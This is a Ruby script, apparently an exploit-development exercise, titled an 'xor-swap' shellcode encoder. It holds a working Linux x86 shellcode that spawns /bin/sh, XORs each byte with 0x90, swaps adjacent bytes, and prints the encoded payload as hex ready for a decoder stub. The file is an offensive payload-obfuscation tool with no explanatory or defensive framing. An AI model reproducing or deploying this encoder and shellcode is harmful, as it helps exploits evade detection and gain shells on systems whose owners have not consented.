#!/usr/bin/ruby


puts "**xor-swap (xwap) encoder**"

RAW_SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

ENCODER_KEY_BYTE="\x90"
aKey=ENCODER_KEY_BYTE.bytes.to_a[0]

encoded_shellcode=""
xored_shellcode=""


RAW_SHELLCODE.bytes.each do |aByte|
    puts "xor_source=0x"+("%02x" % aByte)+"&after=0x"+("%02x" % (aByte^aKey))
    xored_shellcode.concat(aByte^aKey)
end

puts "[+]shellcode length="+RAW_SHELLCODE.length.to_s
puts "[+]after xor shellcode length="+xored_shellcode.length.to_s

i=1
while i<xored_shellcode.length
   puts "[+] swaping "+(i-1).to_s+" and "+i.to_s
   xored_shellcode[i-1],xored_shellcode[i]=xored_shellcode[i],xored_shellcode[i-1] 
   i=i+2
end


#encoded_shellcode.concat(xored_shellcode)
encoded_shellcode.concat("0x"+("%02x" % aKey)+",")

xored_shellcode.bytes {|aByte| encoded_shellcode.concat("0x"+ ("%02x" % aByte)+",")}
encoded_shellcode.chomp!(",")

puts "[+] encoding done."
puts "[+] encoded shellcode size: "+(encoded_shellcode.count(",")+1).to_s
puts encoded_shellcode
